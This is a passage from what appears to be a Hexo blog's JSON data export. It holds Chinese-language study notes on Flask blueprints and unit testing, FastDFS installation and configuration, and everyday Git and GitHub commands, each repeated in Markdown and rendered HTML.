class=\"language-none\">之前写的都在一个py文件中\n蓝图就是分割各个块\n将视图写在其他的py文件中，那么不用再给写在外面的视图加装饰器，可以在有app的py文件中导入，然后通过app.route(&quot;路径&quot;)(视图函数)\n\n蓝图的正解:\n    &#39;&#39;&#39;\n        蓝图和django中的各个应用差不多,一个蓝图自成一块，在主窗口中注册进app里面就可以使用\n        使用方法:\n            创建一个应用目录，再添加一个__init__.py让这个目录成为一个可以调动的包，再__init__.py中定义好蓝图,再到视图中导入这个蓝图，就可以使用，最后再视图使用之后，再到__init__.py中\n            导入视图中使用了蓝图的视图函数。\n            蓝图再使用模板文件和静态文件的时候，和主app不同，主app有默认的配置，而蓝图中没有，需要再定义蓝图的时候手动设置，和主app的设置方法是一样的\n            蓝图在没有定义静态文件目录和模板文件目录的时候，默认是使用主app的，就算配置可静态目录和模板目录，蓝图也是先去主app的静态目录和模板目录查找，没有找到在回到自己的里面去找，这个时候，就是主app的优先级大于蓝图\n            在视图中使用蓝图:\n                1、在__init__.py中from flask import Blueprint\n                2、在__init__.py中定义蓝图,xx &#x3D; Blueprint(&quot;蓝图名&quot;,__name__)\n                3、导入蓝图\n                4、用蓝图装饰，和主app装饰视图一摸一样的\n                5、在__init__.py中导入使用了蓝图的视图函数（导入到蓝图之下）\n                6、在主app的文件中注册蓝图:app.register_blueprint(蓝图, url_prefix&#x3D;&quot;&#x2F;lqs&quot;)，url_prefix表示前缀\n    &#39;&#39;&#39;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"单元测试\"><a href=\"#单元测试\" class=\"headerlink\" title=\"单元测试\"></a>单元测试</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">在flask中使用单元测试的时候，千万不要动源代码，重新写个测试文件\nimport unittest\n导入要测试的flask代码文件\n创建测试类，继承unittest.TestCase\n定义好测试函数\nimport unittest\nimport json\nfrom flaskDay14 import Test\n\nclass Index(unittest.TestCase):\n    def setUp(self):\n        # 设置flask工作在测试模式下，在测试出错的时候会给出具体错误行\n        Test.app.testing &#x3D; True\n        # 模拟flask客户端,setUp中的代码会在所有函数之前调用\n        self.client &#x3D; Test.app.test_client()\n    def test_index(self):\n        # 模拟请求返回数据\n        ret &#x3D; self.client.post(&quot;&#x2F;index&quot;, data&#x3D;&#123;&quot;username&quot;:&quot;lqs&quot;, &quot;password&quot;:&quot;lqs&quot;&#125;)\n        # 拿到数据\n        resp &#x3D; ret.data\n        # 装成字典\n        resp &#x3D; json.loads(resp)\n        # 断言\n        self.assertIn(&quot;code&quot;, resp)\n        self.assertEqual(resp[&quot;code&quot;], 2)\n\n\nif __name__ &#x3D;&#x3D; &#39;__main__&#39;:\n    # 测试\n    unittest.main()\n\n对所有的测试都可以使用<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>"},{"title":"fdfs搭建","top":false,"cover":false,"toc":true,"mathjax":true,"date":"2023-01-19T08:14:57.000Z","password":"5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87","summary":"FastDfs搭建","_content":"## FastDFS\n---\n### FastDFS安装\n#### 安装fastdfs依赖包libfastcommon-master\n```shell\n./make.sh\nsudo ./make.sh install\n```\n#### 安装fastdfs\n```\nfastdfs-master目录中\n./make.sh\nsudo ./make.sh install\n```\t\n#### 配置tracker\n\n```\t\t\ncp/etc/fdfs/tracker.conf.sample/etc/fdfs/tracker.conf\n\n在/home/python/目录中创建目录 fastdfs/tracker      \t\t\t\n    mkdir –p /home/python/fastdfs/tracker\n\n编辑/etc/fdfs/tracker.conf配置文件    \n    sudo vim /etc/fdfs/tracker.conf\n    修改 base_path=xxx\n```\t\n#### 配置storage\n```\nsudo cp /etc/fdfs/storage.conf.sample /etc/fdfs/storage.conf\n\n在/home/python/fastdfs/ 目录中创建目录 storage\n    mkdir –p /home/python/fastdfs/storage\n\n编辑/etc/fdfs/storage.conf配置文件  \n    sudo vim /etc/fdfs/storage.conf\n\n修改内容：\n    base_path=/home/python/fastdfs/storage\n    store_path0=/home/python/fastdfs/storage\n    tracker_server=自己ubuntu虚拟机的ip地址:22122\n```\n#### 配置client\n\n```\nbase_path=/home/python/fastdfs/tracker\ntracker_server=自己ubuntu虚拟机的ip地址:22122\n```\t\n\n### 上传文件测试\n\n```\nfdfs_upload_file /etc/fdfs/client.conf 要上传的图片文件 \n```","source":"_posts/fdfs搭建.md","raw":"---\ntitle: fdfs搭建\ntop: false\ncover: false\ntoc: true\nmathjax: true\ndate: 2023-01-19 16:14:57\npassword: 5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87\nsummary: FastDfs搭建\ntags: fdfs\ncategories: 工具\n---\n## FastDFS\n---\n### FastDFS安装\n#### 安装fastdfs依赖包libfastcommon-master\n```shell\n./make.sh\nsudo ./make.sh install\n```\n#### 安装fastdfs\n```\nfastdfs-master目录中\n./make.sh\nsudo ./make.sh install\n```\t\n#### 配置tracker\n\n```\t\t\ncp/etc/fdfs/tracker.conf.sample/etc/fdfs/tracker.conf\n\n在/home/python/目录中创建目录 fastdfs/tracker      \t\t\t\n    mkdir –p /home/python/fastdfs/tracker\n\n编辑/etc/fdfs/tracker.conf配置文件    \n    sudo vim /etc/fdfs/tracker.conf\n    修改 base_path=xxx\n```\t\n#### 配置storage\n```\nsudo cp /etc/fdfs/storage.conf.sample /etc/fdfs/storage.conf\n\n在/home/python/fastdfs/ 目录中创建目录 storage\n    mkdir –p /home/python/fastdfs/storage\n\n编辑/etc/fdfs/storage.conf配置文件  \n    sudo vim /etc/fdfs/storage.conf\n\n修改内容：\n    base_path=/home/python/fastdfs/storage\n    store_path0=/home/python/fastdfs/storage\n    tracker_server=自己ubuntu虚拟机的ip地址:22122\n```\n#### 配置client\n\n```\nbase_path=/home/python/fastdfs/tracker\ntracker_server=自己ubuntu虚拟机的ip地址:22122\n```\t\n\n### 上传文件测试\n\n```\nfdfs_upload_file /etc/fdfs/client.conf 要上传的图片文件 \n```","slug":"fdfs搭建","published":1,"updated":"2023-03-10T02:55:54.129Z","_id":"cld2uqf6600041svk69nrdz5r","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"FastDFS\"><a href=\"#FastDFS\" class=\"headerlink\" title=\"FastDFS\"></a>FastDFS</h2><hr>\n<h3 id=\"FastDFS安装\"><a href=\"#FastDFS安装\" class=\"headerlink\" title=\"FastDFS安装\"></a>FastDFS安装</h3><h4 id=\"安装fastdfs依赖包libfastcommon-master\"><a href=\"#安装fastdfs依赖包libfastcommon-master\" class=\"headerlink\" title=\"安装fastdfs依赖包libfastcommon-master\"></a>安装fastdfs依赖包libfastcommon-master</h4><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">./make.sh\n<span class=\"token function\">sudo</span> ./make.sh <span class=\"token function\">install</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<h4 id=\"安装fastdfs\"><a href=\"#安装fastdfs\" class=\"headerlink\" title=\"安装fastdfs\"></a>安装fastdfs</h4><pre class=\"line-numbers language-none\"><code class=\"language-none\">fastdfs-master目录中\n.&#x2F;make.sh\nsudo .&#x2F;make.sh install<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<h4 id=\"配置tracker\"><a href=\"#配置tracker\" class=\"headerlink\" title=\"配置tracker\"></a>配置tracker</h4><pre class=\"line-numbers language-none\"><code class=\"language-none\">cp&#x2F;etc&#x2F;fdfs&#x2F;tracker.conf.sample&#x2F;etc&#x2F;fdfs&#x2F;tracker.conf\n\n在&#x2F;home&#x2F;python&#x2F;目录中创建目录 fastdfs&#x2F;tracker      \t\t\t\n    mkdir –p &#x2F;home&#x2F;python&#x2F;fastdfs&#x2F;tracker\n\n编辑&#x2F;etc&#x2F;fdfs&#x2F;tracker.conf配置文件    \n    sudo vim &#x2F;etc&#x2F;fdfs&#x2F;tracker.conf\n    修改 base_path&#x3D;xxx<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h4 id=\"配置storage\"><a href=\"#配置storage\" class=\"headerlink\" title=\"配置storage\"></a>配置storage</h4><pre class=\"line-numbers language-none\"><code class=\"language-none\">sudo cp &#x2F;etc&#x2F;fdfs&#x2F;storage.conf.sample &#x2F;etc&#x2F;fdfs&#x2F;storage.conf\n\n在&#x2F;home&#x2F;python&#x2F;fastdfs&#x2F; 目录中创建目录 storage\n    mkdir –p &#x2F;home&#x2F;python&#x2F;fastdfs&#x2F;storage\n\n编辑&#x2F;etc&#x2F;fdfs&#x2F;storage.conf配置文件  \n    sudo vim &#x2F;etc&#x2F;fdfs&#x2F;storage.conf\n\n修改内容：\n    base_path&#x3D;&#x2F;home&#x2F;python&#x2F;fastdfs&#x2F;storage\n    store_path0&#x3D;&#x2F;home&#x2F;python&#x2F;fastdfs&#x2F;storage\n    tracker_server&#x3D;自己ubuntu虚拟机的ip地址:22122<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h4 id=\"配置client\"><a href=\"#配置client\" class=\"headerlink\" title=\"配置client\"></a>配置client</h4><pre class=\"line-numbers language-none\"><code class=\"language-none\">base_path&#x3D;&#x2F;home&#x2F;python&#x2F;fastdfs&#x2F;tracker\ntracker_server&#x3D;自己ubuntu虚拟机的ip地址:22122<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<h3 id=\"上传文件测试\"><a href=\"#上传文件测试\" class=\"headerlink\" title=\"上传文件测试\"></a>上传文件测试</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">fdfs_upload_file &#x2F;etc&#x2F;fdfs&#x2F;client.conf 要上传的图片文件 <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>","site":{"data":{}},"excerpt":"","more":"<h2 id=\"FastDFS\"><a href=\"#FastDFS\" class=\"headerlink\" title=\"FastDFS\"></a>FastDFS</h2><hr>\n<h3 id=\"FastDFS安装\"><a href=\"#FastDFS安装\" class=\"headerlink\" title=\"FastDFS安装\"></a>FastDFS安装</h3><h4 id=\"安装fastdfs依赖包libfastcommon-master\"><a href=\"#安装fastdfs依赖包libfastcommon-master\" class=\"headerlink\" title=\"安装fastdfs依赖包libfastcommon-master\"></a>安装fastdfs依赖包libfastcommon-master</h4><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">./make.sh\n<span class=\"token function\">sudo</span> ./make.sh <span class=\"token function\">install</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<h4 id=\"安装fastdfs\"><a href=\"#安装fastdfs\" class=\"headerlink\" title=\"安装fastdfs\"></a>安装fastdfs</h4><pre class=\"line-numbers language-none\"><code class=\"language-none\">fastdfs-master目录中\n.&#x2F;make.sh\nsudo .&#x2F;make.sh install<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<h4 id=\"配置tracker\"><a href=\"#配置tracker\" class=\"headerlink\" title=\"配置tracker\"></a>配置tracker</h4><pre class=\"line-numbers language-none\"><code class=\"language-none\">cp&#x2F;etc&#x2F;fdfs&#x2F;tracker.conf.sample&#x2F;etc&#x2F;fdfs&#x2F;tracker.conf\n\n在&#x2F;home&#x2F;python&#x2F;目录中创建目录 fastdfs&#x2F;tracker      \t\t\t\n    mkdir –p &#x2F;home&#x2F;python&#x2F;fastdfs&#x2F;tracker\n\n编辑&#x2F;etc&#x2F;fdfs&#x2F;tracker.conf配置文件    \n    sudo vim &#x2F;etc&#x2F;fdfs&#x2F;tracker.conf\n    修改 base_path&#x3D;xxx<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h4 id=\"配置storage\"><a href=\"#配置storage\" class=\"headerlink\" title=\"配置storage\"></a>配置storage</h4><pre class=\"line-numbers language-none\"><code class=\"language-none\">sudo cp &#x2F;etc&#x2F;fdfs&#x2F;storage.conf.sample &#x2F;etc&#x2F;fdfs&#x2F;storage.conf\n\n在&#x2F;home&#x2F;python&#x2F;fastdfs&#x2F; 目录中创建目录 storage\n    mkdir –p &#x2F;home&#x2F;python&#x2F;fastdfs&#x2F;storage\n\n编辑&#x2F;etc&#x2F;fdfs&#x2F;storage.conf配置文件  \n    sudo vim &#x2F;etc&#x2F;fdfs&#x2F;storage.conf\n\n修改内容：\n    base_path&#x3D;&#x2F;home&#x2F;python&#x2F;fastdfs&#x2F;storage\n    store_path0&#x3D;&#x2F;home&#x2F;python&#x2F;fastdfs&#x2F;storage\n    tracker_server&#x3D;自己ubuntu虚拟机的ip地址:22122<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h4 id=\"配置client\"><a href=\"#配置client\" class=\"headerlink\" title=\"配置client\"></a>配置client</h4><pre class=\"line-numbers language-none\"><code class=\"language-none\">base_path&#x3D;&#x2F;home&#x2F;python&#x2F;fastdfs&#x2F;tracker\ntracker_server&#x3D;自己ubuntu虚拟机的ip地址:22122<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<h3 id=\"上传文件测试\"><a href=\"#上传文件测试\" class=\"headerlink\" title=\"上传文件测试\"></a>上传文件测试</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">fdfs_upload_file &#x2F;etc&#x2F;fdfs&#x2F;client.conf 要上传的图片文件 <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>"},{"title":"git笔记","top":false,"cover":false,"toc":true,"mathjax":true,"date":"2023-01-19T07:07:32.000Z","password":"5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87","summary":"Git工具使用","_content":"## Git（文件只有放入了暂存区之后才会被追踪）\n### 特点\n-\t版本控制:解决多人同时开发的代码问题，解决找回历史代码的问题\n-\t分布式:Git是分布式版本控制系统，如同一个GIT仓库，可以分不到不同的机器上，工作原理:找一台电脑做服务器（中央服务器），不关机，其他的人可以把这个服务器克隆到自己的电脑上\n\n### 安装Git\n```shell\nsudo apt-get install git\n```\n#### 创建版本库\n```shell\ngit init\n```\n#### 创建版本(两步)\n```shell\ngit add 文件\n\ngit commit -m ‘版本说明’ # 版本:第一次创建版本的时候是记录里面的内容，以后的版本都是保存被修改的信息\n```\n#### 查询版本记录信息\n```shell\n git log\n\n git log --pretty=oneline # 更好用\n\n git log --graph --pretty=oneline # 可以查看分支图\n```\n#### 版本的回退\n>\t有一个指针HEAD指向最新的版本， 上一个版本可以被表示为\n\t\n> HEAD^,一个^表示前一个版本，100个^表示第前100个版本,还可以表示为:HEAD~1,HEAD~100,分别表示前一个和前100个版本\n \n> 版本回退命令\n\n```shell\n git reset –hard HEAD~1\n```\n> 版本前进命令\n\n```shell\ngit reset –hard 版本编号 #（commit) 版本编号可以通过git reflog来查看，这里面都是操作记录\n```\n\n### 工作区\n就是使用git init命令的目录，创建文件和编辑文件都是在工作区完成的\n版本库:拥有暂存区,HEAD区\n```shell\ngit add . # 就是添加修改到暂存区,git commit就是创建版本\n\ngit status # 可以查看工作区的情况\n\ngit add # 可以同时添加很多个文件（也可以是目录）到暂存区，用空格分别，并且使用git commit的时候可以将同时提交的所有文件，创建一个版本，\n\ngit checkout – 文件名 # 在没有加到暂存区可以直接用这个命令丢弃修改(删除以后也可用这个恢复)，如果已经加到了暂存区，可以通过git reset HEAD 文件名解除添加到暂存区，然后用这个命令直接放弃修改\n```\n\n\n\n#### 删除文件\nrm 文件名,因为是对工作区的文件的修改，所以可以用git checkout恢复，也可以用git rm将删除放入暂存区，彻底删除。\n```text\n第一步：使用rm\n第二步：如果要恢复,git checkout --文件名,如果要删除，git rm放入暂存区\n第三步: 如果删除文件的修改被放入了暂存区，可以用git reset HEAD 文件名 解除暂存，然后用git checkout恢复\n```\n\n\n\n#### git 分支的概念(比如两个平行的宇宙，出现了交点)\n```shell\ngit主分支:master分支,HEAD指向master然后master再指向提交的指针\ngit从分支:dev分支，和master分支相互独立，可以和master分支合并，还可以删除\n\ngit branch可以查看有多少个分支\n创建分支: git branch 名字\n创建新的分支并切换到新分支: git checkout -b dev（名字随便取）,创建了dev分支，HEAD就会指向dev\n切换到master分支: git checkout master\n将dev分支的东西合并到master（一般都是合并在master分支上，也可以合并到其他的相关分支上，比如修复hug的时候）：git merge dev\n删除dev分支：git branch -d dev\n```\n>  分支合并冲突:master分支和其他分支都修改了同一个文件的版本，合并就会报错，解决办法就是手动解决 \n\n>  分支的管理决策: 在两个分支中修改了不同的文件的版本，那么合并的时候，就不会是快速合并,而是跳出一个弹框,第一行写入你的说明信息，退出之后合并完成，或者git merge --no-ff -m 合并版本说明 合并的分支， 这样可以禁用快速合并，保留分支的文件信息\n\n>  分支bug管理:当我们在一个分支上进行工作的时候，其他的分支有bug需要及时的修复，那么可以使用git stash保存正在工作的分支上的状态，然后马上去需要修复bug的分支上修复bug：\n-\t首先我们要确定在哪一个分支上修复bug \n-\t然后在到那个分支上创建一个临时的分支来修复这个bug \n-\t然后切换回出hug的分支\n-\t然后合并分支，并用 git merge --no-ff -m '说明信息' 临时分支,用来保存bug记录\n-\t然后删除临时分支，在修复完成以后,再回到最初工作的分支\n-\t用git stash pop恢复工作现场就可以继续工作（用git stash list 可以查看保存的工作现场的列表)\n\n\n\n\n#### 链接远程的仓库\n```text\n生成ssh公钥:ssh-keygen -t rsa -C'749062870@qq.com'一直回车(3个)\n\n生成的ssh存放在用户文件夹下面的.ssh下面\n\n将.ssh下面的id_rsa.pub内容复制到github\n\n使用ssh -T git@github.com来测试是否连通\n```\n\n\n#### GitHub：\n```text\n1、创建新的仓库(同git中的git init): start project  => 项目名称 => 公开 => 两个add(readme使用说明，gitignore忽略文件)\n2、添加ssh账户(本机和github交互):创好仓库之后，点击头像下拉，找到settings => SSH and GPG keys => New SSH key就可以添加本地ssh账户，Title随便写,Key则需要本地的ssh公钥，（生成本地电脑的ssh公钥，回到家目录，编辑vim .gitconfig,然后ssh-keygen -t rsa -C '749062870@qq.com'一直回车，完成之后，cd ssh，然后cat id_rsa.pub，复制过去就行了）\n3、克隆项目:github中的仓库中，code下拉中，选择ssh(我们用的就是ssh)，复制地址到相对应的文件夹下用终端 git clone 复制的地址, 将github中的项目下载到本地\n4、推送代码:被下载到本地的项目,不用master分支开发，而是创建一个自己的分支，一直在自己的分支上开发，开发完成之后先add，commit到本地，然后可以用git push origin 分支名称，就可以推送到github上面\n5、追踪远程分支：git branch --set-upstream-to=origin/远程分支 本地分支,追踪之后，就可以用git status来查看本地分支和远程分支的提交情况\n6、拉去代码: git pull origin 要拉取的分支.从远程分支上下载，拉取代码\n\n```\n\n> 链接——>切换分支-->add--->commit---->push到lqs\n\n##### 常用命令\n\n```shell\ngit config --global user.name '用户名' # 修改配置的用户名\ngit config --global user.email '邮箱'  # 修改配置的邮箱\n\ngit init # 初始化git仓库\ngit status # 查看工作区的文件是否被管理\ngit add . # 把工作区的文件提交到暂存区，也就是将工作区的文件进行管理\ngit commit -m '日志' # 将暂存区的文件提交到本地仓库\ngit log # 查看提交的日志，点击q退出\ngit branch # 查看本地分支\ngit branch -a # 查看本地和远程的分支\ngit checkout '远程分支' # 可以从本地分支切换到远程分支\ngit checkout -b '分支名称' # 新建并切换到分支\ngit branch -d '分支名称' # 删除分支，分支被合并之后才允许删除\ngit branch -D '分支名称' # 删除分支，强制删除\ngit merge '分支名称' # 合并分支\ngit push '远程地址 '# 将本地仓库推送到远程仓库或者如下\ngit remote add origin '远程地址' # 给远程仓库添加别名\ngit push -u origin '分支名称' # 远程仓库没有这个分支，第一次向远程仓库推送分支\ngit push  # 第二次推送\ngit clone '远程地址' # 克隆远程仓库的代码\ngit pull '远程地址' '远程分支' # 拉去远程仓库的代码\n```","source":"_posts/git笔记.md","raw":"---\ntitle: git笔记\ntop: false\ncover: false\ntoc: true\nmathjax: true\ndate: 2023-01-19 15:07:32\npassword: 5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87\nsummary: Git工具使用\ntags: git\ncategories: 工具\n---\n## Git（文件只有放入了暂存区之后才会被追踪）\n### 特点\n-\t版本控制:解决多人同时开发的代码问题，解决找回历史代码的问题\n-\t分布式:Git是分布式版本控制系统，如同一个GIT仓库，可以分不到不同的机器上，工作原理:找一台电脑做服务器（中央服务器），不关机，其他的人可以把这个服务器克隆到自己的电脑上\n\n### 安装Git\n```shell\nsudo apt-get install git\n```\n#### 创建版本库\n```shell\ngit init\n```\n#### 创建版本(两步)\n```shell\ngit add 文件\n\ngit commit -m ‘版本说明’ # 版本:第一次创建版本的时候是记录里面的内容，以后的版本都是保存被修改的信息\n```\n#### 查询版本记录信息\n```shell\n git log\n\n git log --pretty=oneline # 更好用\n\n git log --graph --pretty=oneline # 可以查看分支图\n```\n#### 版本的回退\n>\t有一个指针HEAD指向最新的版本， 上一个版本可以被表示为\n\t\n> HEAD^,一个^表示前一个版本，100个^表示第前100个版本,还可以表示为:HEAD~1,HEAD~100,分别表示前一个和前100个版本\n \n> 版本回退命令\n\n```shell\n git reset –hard HEAD~1\n```\n> 版本前进命令\n\n```shell\ngit reset –hard 版本编号 #（commit) 版本编号可以通过git reflog来查看，这里面都是操作记录\n```\n\n### 工作区\n就是使用git init命令的目录，创建文件和编辑文件都是在工作区完成的\n版本库:拥有暂存区,HEAD区\n```shell\ngit add . # 就是添加修改到暂存区,git commit就是创建版本\n\ngit status # 可以查看工作区的情况\n\ngit add # 可以同时添加很多个文件（也可以是目录）到暂存区，用空格分别，并且使用git commit的时候可以将同时提交的所有文件，创建一个版本，\n\ngit checkout – 文件名 # 在没有加到暂存区可以直接用这个命令丢弃修改(删除以后也可用这个恢复)，如果已经加到了暂存区，可以通过git reset HEAD 文件名解除添加到暂存区，然后用这个命令直接放弃修改\n```\n\n\n\n#### 删除文件\nrm 文件名,因为是对工作区的文件的修改，所以可以用git checkout恢复，也可以用git rm将删除放入暂存区，彻底删除。\n```text\n第一步：使用rm\n第二步：如果要恢复,git checkout --文件名,如果要删除，git rm放入暂存区\n第三步: 如果删除文件的修改被放入了暂存区，可以用git reset HEAD 文件名 解除暂存，然后用git checkout恢复\n```\n\n\n\n#### git 分支的概念(比如两个平行的宇宙，出现了交点)\n```shell\ngit主分支:master分支,HEAD指向master然后master再指向提交的指针\ngit从分支:dev分支，和master分支相互独立，可以和master分支合并，还可以删除\n\ngit branch可以查看有多少个分支\n创建分支: git branch 名字\n创建新的分支并切换到新分支: git checkout -b dev（名字随便取）,创建了dev分支，HEAD就会指向dev\n切换到master分支: git checkout master\n将dev分支的东西合并到master（一般都是合并在master分支上，也可以合并到其他的相关分支上，比如修复hug的时候）：git merge dev\n删除dev分支：git branch -d dev\n```\n>  分支合并冲突:master分支和其他分支都修改了同一个文件的版本，合并就会报错，解决办法就是手动解决 \n\n>  分支的管理决策: 在两个分支中修改了不同的文件的版本，那么合并的时候，就不会是快速合并,而是跳出一个弹框,第一行写入你的说明信息，退出之后合并完成，或者git merge --no-ff -m 合并版本说明 合并的分支， 这样可以禁用快速合并，保留分支的文件信息\n\n>  分支bug管理:当我们在一个分支上进行工作的时候，其他的分支有bug需要及时的修复，那么可以使用git stash保存正在工作的分支上的状态，然后马上去需要修复bug的分支上修复bug：\n-\t首先我们要确定在哪一个分支上修复bug \n-\t然后在到那个分支上创建一个临时的分支来修复这个bug \n-\t然后切换回出hug的分支\n-\t然后合并分支，并用 git merge --no-ff -m '说明信息' 临时分支,用来保存bug记录\n-\t然后删除临时分支，在修复完成以后,再回到最初工作的分支\n-\t用git stash pop恢复工作现场就可以继续工作（用git stash list 可以查看保存的工作现场的列表)\n\n\n\n\n#### 链接远程的仓库\n```text\n生成ssh公钥:ssh-keygen -t rsa -C'749062870@qq.com'一直回车(3个)\n\n生成的ssh存放在用户文件夹下面的.ssh下面\n\n将.ssh下面的id_rsa.pub内容复制到github\n\n使用ssh -T git@github.com来测试是否连通\n```\n\n\n#### GitHub：\n```text\n1、创建新的仓库(同git中的git init): start project  => 项目名称 => 公开 => 两个add(readme使用说明，gitignore忽略文件)\n2、添加ssh账户(本机和github交互):创好仓库之后，点击头像下拉，找到settings => SSH and GPG keys => New SSH key就可以添加本地ssh账户，Title随便写,Key则需要本地的ssh公钥，（生成本地电脑的ssh公钥，回到家目录，编辑vim .gitconfig,然后ssh-keygen -t rsa -C '749062870@qq.com'一直回车，完成之后，cd ssh，然后cat id_rsa.pub，复制过去就行了）\n3、克隆项目:github中的仓库中，code下拉中，选择ssh(我们用的就是ssh)，复制地址到相对应的文件夹下用终端 git clone 复制的地址, 将github中的项目下载到本地\n4、推送代码:被下载到本地的项目,不用master分支开发，而是创建一个自己的分支，一直在自己的分支上开发，开发完成之后先add，commit到本地，然后可以用git push origin 分支名称，就可以推送到github上面\n5、追踪远程分支：git branch --set-upstream-to=origin/远程分支 本地分支,追踪之后，就可以用git status来查看本地分支和远程分支的提交情况\n6、拉去代码: git pull origin 要拉取的分支.从远程分支上下载，拉取代码\n\n```\n\n> 链接——>切换分支-->add--->commit---->push到lqs\n\n##### 常用命令\n\n```shell\ngit config --global user.name '用户名' # 修改配置的用户名\ngit config --global user.email '邮箱'  # 修改配置的邮箱\n\ngit init # 初始化git仓库\ngit status # 查看工作区的文件是否被管理\ngit add . # 把工作区的文件提交到暂存区，也就是将工作区的文件进行管理\ngit commit -m '日志' # 将暂存区的文件提交到本地仓库\ngit log # 查看提交的日志，点击q退出\ngit branch # 查看本地分支\ngit branch -a # 查看本地和远程的分支\ngit checkout '远程分支' # 可以从本地分支切换到远程分支\ngit checkout -b '分支名称' # 新建并切换到分支\ngit branch -d '分支名称' # 删除分支，分支被合并之后才允许删除\ngit branch -D '分支名称' # 删除分支，强制删除\ngit merge '分支名称' # 合并分支\ngit push '远程地址 '# 将本地仓库推送到远程仓库或者如下\ngit remote add origin '远程地址' # 给远程仓库添加别名\ngit push -u origin '分支名称' # 远程仓库没有这个分支，第一次向远程仓库推送分支\ngit push  # 第二次推送\ngit clone '远程地址' # 克隆远程仓库的代码\ngit pull '远程地址' '远程分支' # 拉去远程仓库的代码\n```","slug":"git笔记","published":1,"updated":"2023-03-10T02:55:38.334Z","_id":"cld2uqf6700051svk3x1qckjr","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"Git（文件只有放入了暂存区之后才会被追踪）\"><a href=\"#Git（文件只有放入了暂存区之后才会被追踪）\" class=\"headerlink\" title=\"Git（文件只有放入了暂存区之后才会被追踪）\"></a>Git（文件只有放入了暂存区之后才会被追踪）</h2><h3 id=\"特点\"><a href=\"#特点\" class=\"headerlink\" title=\"特点\"></a>特点</h3><ul>\n<li>   版本控制:解决多人同时开发的代码问题，解决找回历史代码的问题</li>\n<li>   分布式:Git是分布式版本控制系统，如同一个GIT仓库，可以分不到不同的机器上，工作原理:找一台电脑做服务器（中央服务器），不关机，其他的人可以把这个服务器克隆到自己的电脑上</li>\n</ul>\n<h3 id=\"安装Git\"><a href=\"#安装Git\" class=\"headerlink\" title=\"安装Git\"></a>安装Git</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">sudo</span> <span class=\"token function\">apt-get</span> <span class=\"token function\">install</span> <span class=\"token function\">git</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<h4 id=\"创建版本库\"><a href=\"#创建版本库\" class=\"headerlink\" title=\"创建版本库\"></a>创建版本库</h4><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">git</span> init<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<h4 id=\"创建版本-两步\"><a href=\"#创建版本-两步\" class=\"headerlink\" title=\"创建版本(两步)\"></a>创建版本(两步)</h4><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">git</span> <span class=\"token function\">add</span> 文件\n\n<span class=\"token function\">git</span> commit <span class=\"token parameter variable\">-m</span> ‘版本说明’ <span class=\"token comment\"># 版本:第一次创建版本的时候是记录里面的内容，以后的版本都是保存被修改的信息</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<h4 id=\"查询版本记录信息\"><a href=\"#查询版本记录信息\" class=\"headerlink\" title=\"查询版本记录信息\"></a>查询版本记录信息</h4><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">git</span> log\n\n<span class=\"token function\">git</span> log <span class=\"token parameter variable\">--pretty</span><span class=\"token operator\">=</span>oneline <span class=\"token comment\"># 更好用</span>\n\n<span class=\"token function\">git</span> log <span class=\"token parameter variable\">--graph</span> <span class=\"token parameter variable\">--pretty</span><span class=\"token operator\">=</span>oneline <span class=\"token comment\"># 可以查看分支图</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h4 id=\"版本的回退\"><a href=\"#版本的回退\" class=\"headerlink\" 